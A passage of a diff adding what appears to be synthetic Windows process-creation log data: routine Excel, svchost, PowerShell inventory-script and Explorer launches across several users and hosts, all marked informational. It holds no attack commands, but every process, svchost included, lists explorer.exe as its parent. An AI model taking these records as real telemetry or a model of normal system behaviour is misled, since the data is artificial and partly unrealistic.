+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:57:59Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T15:58:14Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:06:18Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:09:20Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:14:28Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:17:16Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:17:34Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:18:01Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:18:02Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:22:43Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:24:25Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:32:50Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:33:04Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:40:03Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:41:49Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:42:15Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:47:29Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:52:03Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:52:56Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:53:36Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:57:32Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:58:02Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T16:58:47Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:11:10Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:14:52Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:16:28Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:17:29Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:25:16Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:26:42Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:29:53Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:33:57Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:45:20Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:45:32Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:52:19Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:56:27Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T17:59:42Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  }
+ ]
+}
